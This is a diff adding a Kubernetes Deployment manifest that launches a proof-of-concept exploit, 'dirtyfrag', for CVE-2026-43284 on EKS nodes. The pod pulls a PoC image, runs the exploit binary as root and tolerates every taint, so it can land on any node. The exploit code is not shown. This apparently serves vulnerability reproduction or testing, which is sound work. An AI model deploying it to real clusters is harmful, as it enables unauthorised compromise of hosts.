@@ -1,0 +1,34 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: dirtyfrag-poc-eks
+  labels:
+    app.kubernetes.io/name: dirtyfrag-poc-eks
+    app.kubernetes.io/part-of: cve-2026-43284
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: dirtyfrag-poc-eks
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: dirtyfrag-poc-eks
+        app.kubernetes.io/part-of: cve-2026-43284
+    spec:
+      nodeSelector:
+        kubernetes.io/os: linux
+      tolerations:
+        - operator: Exists
+      containers:
+        - name: dirtyfrag-poc-eks
+          image: ghcr.io/percivalll/dirty-frag-kubernetes-poc:eks
+          imagePullPolicy: IfNotPresent
+          command:
+            - /bin/sh
+            - -c
+            - /bin/dirtyfrag && sleep 365d
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: false
+            runAsNonRoot: false
